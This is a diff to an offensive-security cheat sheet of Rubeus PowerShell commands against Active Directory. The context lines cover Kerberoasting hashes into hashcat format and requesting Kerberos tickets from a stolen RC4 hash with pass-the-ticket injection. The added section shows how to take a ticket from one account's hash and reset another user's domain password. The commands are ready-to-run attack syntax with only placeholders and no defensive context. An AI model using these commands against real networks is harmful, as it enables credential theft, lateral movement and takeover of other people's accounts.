@@ -24,3 +24,9 @@ Invoke-Rubeus 'kerberoast /outfile:hashes.<domain>.txt /format:hashcat /domain:<
 ```powershell
 Invoke-Rubeus 'asktgt /user:<user> /rc4:<hash> /domain:<domain> /ptt'
 ```
+
+## Change password for another user using kerberos ticket
+```powershell
+Invoke-Rubeus 'asktgt /user:<user_can_change_passwords> /changepw /rc4:<hash> /domain:<domain> /outfile:<user_can_change_passwords>.ticket'
+Invoke-Rubeus 'changepw /ticket:<user_can_change_passwords>.ticket /new:<new_password> /targetuser:<domain.local>\<user_to_change_password> /dc:<dc>.<domain>.local'
+```
